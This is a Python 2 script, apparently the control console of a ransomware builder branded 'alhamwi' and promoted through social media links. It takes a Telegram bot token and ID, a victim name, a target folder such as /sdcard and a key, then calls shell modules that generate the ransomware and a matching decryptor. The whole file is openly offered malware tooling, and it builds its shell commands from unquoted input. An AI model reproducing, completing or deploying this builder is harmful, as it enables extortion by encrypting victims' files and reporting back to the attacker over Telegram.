import os, sys, subprocess
from time import sleep
os.system("clear")
reload(sys)
sys.setdefaultencoding("utf-8")
token = " "
Id = " "
output = " "
files = " "
name = " "
kay = " "
def logo():
 os.system('python3 buner.py')
 print("""
\033[1;31m      youtube : \033[1;37mhttps://www.youtube.com/@al0hamwi
\033[1;31m      instagram : \033[1;37mhttps://www.instagram.com/al0hamwi
 """)

def help():
 print("""
\033[1;31m  Commands :
\033[1;32m       set TOKEN\033[1;34m      : \033[1;33mSet Your Bot token \033[1;34m(\033[1;37mset Token gfhdghdg#\033[1;34m)
\033[1;32m       set ID\033[1;34m         : \033[1;33mSet Your Id Telegram \033[1;34m(\033[1;37mset Id 1337\033[1;34m)
\033[1;32m       set OUTPUT\033[1;34m     : \033[1;33mSet Your Output Name And Path \033[1;34m(\033[1;37mset OUTPUT /home/encryption\033[1;34m)
\033[1;32m       show \033[1;34m          : \033[1;33mShow Token, Id And Output Value and name and 
\033[1;32m       set files\033[1;34m      : \033[1;33mSet pwd Files enc or dec \033[1;34m(\033[1;37mset files /sdcard\033[1;34m)
\033[1;32m       set KAY\033[1;34m        : \033[1;33mSet Your kay Ransomware \033[1;34m(\033[1;37mset kay bs75b45by45y\033[1;34m)
\033[1;32m       set NAME\033[1;34m       : \033[1;33mSet Your Victam Name \033[1;34m(\033[1;37mset name VictamName\033[1;34m)
\033[1;32m       encryption\033[1;34m     : \033[1;33mmake encryption file \033[1;34m(\033[1;37mencryption or enc\033[1;34m)
\033[1;32m       decryption\033[1;34m     : \033[1;33mmake decryption file \033[1;34m(\033[1;37mdecryption or dec\033[1;34m) \n""")

def main():
    global token, Id, output , files , name

    while True:
        cmd = raw_input("\033[0;31m--\033[0;31m(\033[1;34malhamwi\033[0;31m)(\033[1;35mRansomware\033[0;31m)---\033[1;34m$\033[1;37m ").lower()

        if cmd == "help":
            help()

        elif cmd == 'banner':
            os.system("clear")
            logo()
            main()

        elif "clear" in cmd:
            os.system("clear")

        elif "set token" in cmd:
            token = cmd.split()[-1]
            
        elif "set name" in cmd:
            name = str(cmd.split()[-1])
        elif "set files" in cmd:
            files = cmd.split()[-1]
            
        elif "set kay" in cmd:
            kay = cmd.split()[-1]

        elif "set id" in cmd:
            Id = int(cmd.split()[-1])

        elif "set output" in cmd:
            output = cmd.split()[-1]

        elif cmd == "show values" or cmd == "show":
            print "\n[+] TOKEN   : %s\n[+] ID   : %s\n[+] OUTPUT : %s\n[+] FILES : %s\n[+] NAME : %s\n"%(token, Id,output,files,name)

        elif cmd == "encryption" or cmd == "enc":
            if token != " " and Id != " " and output != " " and files != " " and name != " ":
                print("[+] Generating Ransomware . . .")
                sleep(1)
                print("[*] Using Configuration . . .\n |_ TOKEN   : "+token+"\n |_ ID   : "+str(Id)+"\n |_ OUTPUT : "+output+"\n |_ FILES : "+files+"\n |_ NAME : "+name)
                sleep(3)
                os.system("sh modules/enc.sh "+token+" "+str(Id)+" "+output+" "+files+" "+name)
                print("[+] Generating Success . . .")
                sleep(1)
                main()
            else:
                print "\n\033[0;31m[!] TOKEN   : %s\n[!] ID   : %s\n[!] OUTPUT : %s\n[!] FILES   : %s\n[!] NAME   : %s\n"%(token,Id,output,files,name)

        elif cmd == "decryption" or cmd == "dec":
            if files != " " and output != " " and kay != " ":
                print("[+] Generating Kay Ransomware . . .")
                sleep(1)
                print("\033[1;32m[\033[1;34m*]\033[1;32m \033[1;32mUsing Configuration . . .\n |_ KAY   : "+kay+"\n |_ OUTPUT : "+output+"\n |_ FILES : "+files)
                sleep(3)
                os.system("sh modules/dec.sh "+kay+" "+output+" "+files)
                print("[+] Generating Success . . .")
                sleep(1)
                main()
            else:
                print "\n\033[1;32m[\033[1;31m!\033[1;32m] \033[1;33m KAY : %s\n\033[1;32m[\033[1;31m!\033[1;32m] \033[1;33m OUTPUT : %s\n\033[1;32m[\033[1;31m!\033[1;32m] \033[1;33m FILES   : %s\n"%(kay,output,files)
        else:
            print("\033[1;31m[!] Check Your Command \033[1;32m. . .")
            main()

def contol():
    try:
        logo()
        main()
    except KeyboardInterrupt:
        print("\n\033[0;31m[!] CTRL+C Detect Exiting Tools \033[1;32m. . .")
        sleep(2)
        sys.exit()
if __name__ == "__main__":
    contol()
